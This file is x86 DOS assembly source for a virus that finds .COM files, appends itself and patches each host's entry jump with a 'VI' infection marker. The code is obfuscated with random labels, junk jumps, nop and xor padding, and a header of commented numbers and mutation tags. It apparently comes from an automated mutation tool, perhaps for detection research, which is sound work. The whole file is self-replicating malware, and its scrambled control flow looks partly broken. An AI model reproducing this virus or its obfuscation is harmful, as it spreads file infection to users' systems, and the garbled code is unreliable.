;1.78486397745
;1.4134843056
;1.34484947995
;1.54111051088
;1.41703644763
;1.706440488
;1.62071902999
;		JZ 	_1
;1.69455460485
;1.42559293067
;1.86502266497
;ForcedJMP_0
;1.65461916792
;1.74374926521
;1.26662390382
;1.42865461814
;1.5233036812
;1.47812429925
;		JZ 	_1
;1.34247186117
;UntouchBlock_1
;1.53434250994
;1.29506880632
;UntouchBlock_1
;1.43396196289
;		JNZ 	_0
;1.48209280258
;ForcedJMP_1
;1.36220358629
;UntouchBlock_1
;1.25777539924
;1.09927150227
;		JNZ 	_1
;0.984347271669
;0.933083715633
;		JZ 	_0
;1.18052509532
;		JNZ 	_0
;1.04233072854
;0.992641078706
;		JZ 	_0
;0.929200400284
;ForcedJMP_0
;1.02055731606
;1.01595496749
;UntouchBlock_1
;0.839653532738
;0.862067088851
;0.756769322937
;0.653410059224
;UntouchBlock_0
;0.59471211144
;0.657088145021
;ForcedJMP_1
;0.563624355471
;		JNZ 	_0
;0.464346530609
;0.339553774146
;		JZ 	_1
;		JNZ 	_0
;ForcedJMP_0
MAIN    SEGMENT BYTE
		ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING
		ORG     100H

HOST:
		jmp     NEAR PTR VIRUS_START   
        db      'VI'
        mov     ah,4CH
        mov     al,0
		cmp 	bx,cx
JZ VZBEO
JMP WZKMB
VZBEO:
WZKMB:
		call 	 VZBEO
        int     21H              

VIRUS:   		                 
COMFILE DB      '*.COM',0        

VIRUS_START:
        call    GET_START       

GET_START:
        sub     WORD PTR [VIR_START],OFFSET GET_START - OFFSET VIRUS
        mov     dx,OFFSET DTA   
        mov     ah,1AH          
        int     21H        
        call    FIND_FILE       
        jz      N1
        jmp     EXIT_VIRUS      
        N1:
        call    INFECT          
        mov     dx,OFFSET FNAME 
		JMP 	QIPPW
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
QIPPW:
        mov     WORD PTR [HANDLE],24H    
        mov     ah,9  
        int     21H             

EXIT_VIRUS:
        mov     dx,80H          
        mov     ah,1AH          
        int     21H             
        mov     bx,[VIR_START]  
		cmp 	bx,cx
JZ _RSYJ
JMP ABEDR
_RSYJ:
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)]  
        mov     WORD PTR [HOST],ax 
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+2]        
        mov     WORD PTR [HOST+2],ax        
		JMP 	UYPPF
HKBNZ:
        mov     al,BYTE PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+4]        
        mov     BYTE PTR [HOST+4],al        
        mov     [VIR_START],100H   
        ret                     

START_CODE:                     
        nop                     
        nop                     
        nop        
        nop        
        nop             
ABEDR:
		call 	 _RSYJ
FZUJM:
		call 	 HZPZX
QAMBJ:
		call 	 HSQJX



FIND_FILE:
        mov     dx,[VIR_START]
        mov     cx,3FH          
		cmp 	ax,dx
JNZ _OALP
JMP FHZHX
_OALP:
		cmp 	bx,cx
JNZ HZPZX
JMP FZUJM
HZPZX:
        mov     ah,4EH          
		JMP 	QAMBJ
HSQJX:
        int     21H
UYPPF:
FHZHX:
		call 	 _OALP
		call 	 HKBNZ


FF_LOOP:
        or      al,al           
		jnz     N2
        jmp     FF_DONE
        N2:         
		call    FILE_OK         
		jnz     N3
        jmp     FF_DONE         
        N3:
		mov     ah,4FH          
		cmp 	cx,cx
JZ MCMMT
JMP UAHRR
MCMMT:
		int     21H             
		jmp     FF_LOOP         

FF_DONE:
        ret
XBGWK:
WXRQL:
		call 	 ZSBAA
		call 	 MOR_Q
UAHRR:
		call 	 MCMMT


FILE_OK:        
        mov     dx,OFFSET FNAME 
		cmp 	cx,ax
JZ ZSBAA
JMP WXRQL
ZSBAA:
		JMP 	XBGWK
MOR_Q:
        mov     dx,OFFSET FNAME 
        mov     ax,3D02H      
        int     21H        
        jnc     N6
        jmp     FOK_NZEND     
    N6:
        mov     bx,ax         
        push    bx            
        mov     cx,5          
        mov     dx,OFFSET START_IMAGE         
        mov     ah,3FH        
        int     21H        		
        pop     bx            
		JMP 	EOING
nop
nop
nop
nop
nop
nop
nop
nop
EOING:
        mov     ah,3EH        
		cmp 	ax,dx
JZ YFXJH
JMP EEF__
YFXJH:
        int     21H           
        mov     ax,WORD PTR [FSIZE]               
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS 
        jnc     N7
        jmp     FOK_NZEND                         
        N7:
        cmp     BYTE PTR [START_IMAGE],0E9H 
        jz      N4
        jmp FOK_ZEND        
        N4: 
        cmp     WORD PTR [START_IMAGE+3],4956H 
        jz      N5
        jmp     FOK_ZEND           
JYNXM:
		call 	 BLWGN
EEF__:
		call 	 YFXJH
        N5:


FOK_NZEND:
        mov     al,1          
        or      al,al         
        ret

FOK_ZEND:
        xor     al,al         
        ret    
YVBIX:
		call 	 EDKES
GPEOX:
		call 	 DCZFG
EHD_V:
		call 	 PMIEJ
RUKUR:
		call 	 GGYBP
        

INFECT:
        mov     dx,OFFSET FNAME  
		JMP 	JYNXM
BLWGN:
        mov     ax,3D02H        
        int     21H        
        mov     WORD PTR [HANDLE],ax            
        xor     cx,cx                       
        mov     dx,cx               
        mov     bx,WORD PTR [HANDLE]        
		JMP 	EHD_V
PMIEJ:
		cmp 	ax,ax
JZ DCZFG
JMP GPEOX
DCZFG:
        mov     ax,4202H                    
        int     21H        
        mov     cx,OFFSET FINAL - OFFSET VIRUS 
		cmp 	ax,ax
JNZ GGYBP
JMP RUKUR
GGYBP:
        mov     dx,[VIR_START]           
		JMP 	ILQLZ
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ILQLZ:
        mov     bx,WORD PTR [HANDLE]                         
        mov     ah,40H                                      
MOJYP:
        int     21H        
        xor     cx,cx           
        mov     dx,WORD PTR [FSIZE]   
        add     dx,OFFSET START_CODE -  OFFSET VIRUS     
        mov     bx,WORD PTR [HANDLE]                         
        mov     ax,4200H                               
		cmp 	ax,dx
JZ EDKES
JMP YVBIX
EDKES:
        int     21H        
        mov     cx,5                                    
OYHKX:
		JMP 	BEEAZ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
BEEAZ:
        mov     bx,WORD PTR [HANDLE]                    
DJSGT:
        mov     dx,OFFSET START_IMAGE                  
        mov     ah,40H        
DVUTN:
        int     21H        
        xor     cx,cx                                 
        mov     dx,cx                             
        mov     bx,WORD PTR [HANDLE]         
        mov     ax,4200H                          
        int     21H
        mov     bx,[VIR_START]                    
        mov     BYTE PTR [START_IMAGE],0E9H     
        mov     ax,WORD PTR [FSIZE]             
		cmp 	dx,dx
JZ FZNWK
JMP _WLWR
FZNWK:
		JMP 	JROKD
MYPFJ:
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3 
        mov     WORD PTR [START_IMAGE+1],ax        
        mov     WORD PTR [START_IMAGE+3],4956H       
        mov     cx,5   
        mov     dx,OFFSET START_IMAGE      
        mov     bx,WORD PTR [HANDLE]       
        mov     ah,40H                     
        int     21H        
        mov     bx,WORD PTR [HANDLE]       
		JMP 	MYEBN
HADDF:
        mov     ah,3EH                     
        int     21H        
JROKD:
		call 	 MYPFJ
_WLWR:
		call 	 FZNWK
MYEBN:
		call 	 HADDF
        ret                                

FINAL:           
ENDVIRUS        EQU     $ + 212    


       ORG     0FF2AH

DTA             DB      1AH dup (?) 
FSIZE           DW      0,0         
FNAME           DB      13 dup (?)  
HANDLE          DW      0           
START_IMAGE     DB      0,0,0,0,0   
VSTACK          DW      50H dup (?) 
VIR_START       DW      (?)         

MAIN    ENDS

        END     HOST                   